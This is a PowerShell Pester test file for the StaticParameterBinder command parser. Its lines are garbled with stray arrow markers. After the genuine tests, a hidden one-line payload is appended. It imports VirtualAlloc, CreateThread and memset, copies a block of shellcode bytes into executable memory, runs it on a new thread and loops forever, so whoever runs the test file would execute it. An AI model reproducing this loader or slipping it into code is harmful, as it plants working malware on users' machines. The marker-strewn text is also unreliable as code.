

using namespace System.Management.Automation.Language

 -||-> Describe "StaticParameterBinder tests" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $testCases = @(
             -||-> @{
                Source =  -||-> 'Get-Alias abc' <-||- 
                Description =  -||-> 'string constant value' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 0 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.ConstantValue | Should -Be 'abc' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-Alias {abc}' <-||- 
                Description =  -||-> 'script block value' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 0 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.Value | Should -BeOfType ( -||-> [ScriptBlockExpressionAst].FullName <-||- ) <-||- 
                     -||-> $result.BoundParameters.Name.Value.Extent.Text | Should -Be '{abc}' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-Alias -Path abc' <-||- 
                Description =  -||-> 'parameter -path not found' <-||- 
                BoundParametersCount =  -||-> 0 <-||- 
                ExceptionCount =  -||-> 1 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BindingExceptions.Path.CommandElement.Extent.Text | Should -Be '-Path' <-||- 
                     -||-> $result.BindingExceptions.Path.BindingException.ErrorId | Should -Be 'NamedParameterNotFound' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-Alias -Path -Name:abc' <-||- 
                Description =  -||-> 'parameter -name found while -path not found' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 1 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.ConstantValue | Should -Be 'abc' <-||- 
                     -||-> $result.BindingExceptions.Path.CommandElement.Extent.Text | Should -Be '-Path' <-||- 
                     -||-> $result.BindingExceptions.Path.BindingException.ErrorId | Should -Be 'NamedParameterNotFound' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-Alias -Name -abc' <-||- 
                Description =  -||-> 'parameter -abc should be used as value' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 0 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.Value | Should -BeOfType ( -||-> [CommandParameterAst].FullName <-||- ) <-||- 
                     -||-> $result.BoundParameters.Name.Value.Extent.Text | Should -Be '-abc' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-Alias aa bb' <-||- 
                Description =  -||-> 'unbound positional parameter bb' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 1 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.ConstantValue | Should -Be 'aa' <-||- 
                     -||-> $result.BindingExceptions.bb.BindingException.ErrorId | Should -Be 'PositionalParameterNotFound' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-Alias aa,bb,cc' <-||- 
                Description =  -||-> 'array argument' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 0 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.Value | Should -BeOfType ( -||-> [ArrayLiteralAst].FullName <-||- ) <-||- 
                     -||-> $result.BoundParameters.Name.Value.Extent.Text | Should -Be 'aa,bb,cc' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-ChildItem -Name abc -rec' <-||- 
                Description =  -||-> 'switch params and positional param' <-||- 
                BoundParametersCount =  -||-> 3 <-||- 
                ExceptionCount =  -||-> 0 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.ConstantValue | Should -BeTrue <-||- 
                     -||-> $result.BoundParameters.Recurse.ConstantValue | Should -BeTrue <-||- 
                     -||-> $result.BoundParameters.Path.ConstantValue | Should -Be 'abc' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-ChildItem -Name -f' <-||- 
                Description =  -||-> 'switch parameter -name found while ambiguous parameter -f' <-||- 
                BoundParametersCount =  -||-> 1 <-||- 
                ExceptionCount =  -||-> 1 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BoundParameters.Name.ConstantValue | Should -BeTrue <-||- 
                     -||-> $result.BindingExceptions.f.CommandElement.Extent.Text | Should -Be '-f' <-||- 
                     -||-> $result.BindingExceptions.f.BindingException.ErrorId | Should -Be 'AmbiguousParameter' <-||- 
                } <-||- 
            },
            @{
                Source =  -||-> 'Get-ChildItem -Path -f' <-||- 
                Description =  -||-> 'non-switch parameter -path followed by ambiguous parameter -f' <-||- 
                BoundParametersCount =  -||-> 0 <-||- 
                ExceptionCount =  -||-> 1 <-||- 
                ValidateScript =  -||-> {
                    param ($result)
                     -||-> $result.BindingExceptions.f.CommandElement.Extent.Text | Should -Be '-f' <-||- 
                     -||-> $result.BindingExceptions.f.BindingException.ErrorId | Should -Be 'AmbiguousParameter' <-||- 
                } <-||- 
            } <-||- 
        ) <-||- 
    } <-||- 

     -||-> It "<Description>: '<Source>'" -TestCases $testCases {
        param ($Source, $BoundParametersCount, $ExceptionCount, $ValidateScript)

         -||-> $ast = [Parser]::ParseInput($Source, [ref]$null, [ref]$null) <-||- 
         -||-> $cmdAst = $ast.Find({ -||-> $args[0] -is [CommandAst] <-||- }, $false) <-||- 
         -||-> $result = [StaticParameterBinder]::BindCommand($cmdAst) <-||- 

         -||-> $result.BoundParameters.Count | Should -Be $BoundParametersCount <-||- 
         -||-> $result.BindingExceptions.Count | Should -Be $ExceptionCount <-||- 
         -||-> . $ValidateScript $result <-||- 
    } <-||- 
} <-||- 

 -||-> $SsUQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $SsUQ -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x3d,0x35,0x8e,0x8e,0xd9,0xcb,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0x32,0xd7,0x7b,0x72,0xa4,0x95,0x84,0x8b,0x34,0xfa,0x0d,0x6e,0x05,0x3a,0x69,0xfa,0x35,0x8a,0xf9,0xae,0xb9,0x61,0xaf,0x5a,0x4a,0x07,0x78,0x6c,0xfb,0xa2,0x5e,0x43,0xfc,0x9f,0xa3,0xc2,0x7e,0xe2,0xf7,0x24,0xbf,0x2d,0x0a,0x24,0xf8,0x50,0xe7,0x74,0x51,0x1e,0x5a,0x69,0xd6,0x6a,0x67,0x02,0xa4,0x7b,0xef,0xf7,0x7c,0x7d,0xde,0xa9,0xf7,0x24,0xc0,0x48,0xd4,0x5c,0x49,0x53,0x39,0x58,0x03,0xe8,0x89,0x16,0x92,0x38,0xc0,0xd7,0x39,0x05,0xed,0x25,0x43,0x41,0xc9,0xd5,0x36,0xbb,0x2a,0x6b,0x41,0x78,0x51,0xb7,0xc4,0x9b,0xf1,0x3c,0x7e,0x40,0x00,0x90,0x19,0x03,0x0e,0x5d,0x6d,0x4b,0x12,0x60,0xa2,0xe7,0x2e,0xe9,0x45,0x28,0xa7,0xa9,0x61,0xec,0xec,0x6a,0x0b,0xb5,0x48,0xdc,0x34,0xa5,0x33,0x81,0x90,0xad,0xd9,0xd6,0xa8,0xef,0xb5,0x1b,0x81,0x0f,0x45,0x34,0x92,0x7c,0x77,0x9b,0x08,0xeb,0x3b,0x54,0x97,0xec,0x3c,0x4f,0x6f,0x62,0xc3,0x70,0x90,0xaa,0x07,0x24,0xc0,0xc4,0xae,0x45,0x8b,0x14,0x4f,0x90,0x1c,0x45,0xff,0x4b,0xdd,0x35,0xbf,0x3b,0xb5,0x5f,0x30,0x63,0xa5,0x5f,0x9b,0x0c,0x4c,0xa5,0x4b,0x1d,0xaf,0x2b,0x3a,0x09,0xcd,0x33,0x3d,0x76,0x58,0xd5,0x57,0x96,0x0d,0x4d,0xcf,0x0f,0x14,0x05,0x6e,0xcf,0x82,0x63,0xb0,0x5b,0x21,0x93,0x7e,0xac,0x4c,0x87,0x16,0x5c,0x1b,0xf5,0xb0,0x63,0xb1,0x90,0x3c,0xf6,0x3e,0x33,0x6b,0x6e,0x3d,0x62,0x5b,0x31,0xbe,0x41,0xd0,0xf8,0x2a,0x2a,0x8e,0x04,0xbb,0xaa,0x4e,0x53,0xd1,0xaa,0x26,0x03,0x81,0xf8,0x53,0x4c,0x1c,0x6d,0xc8,0xd9,0x9f,0xc4,0xbd,0x4a,0xc8,0xea,0x98,0xbd,0x57,0x14,0xcf,0x3f,0xab,0xc3,0x29,0x4a,0xc5,0xd7 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $CoK=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $CoK.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$CoK,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



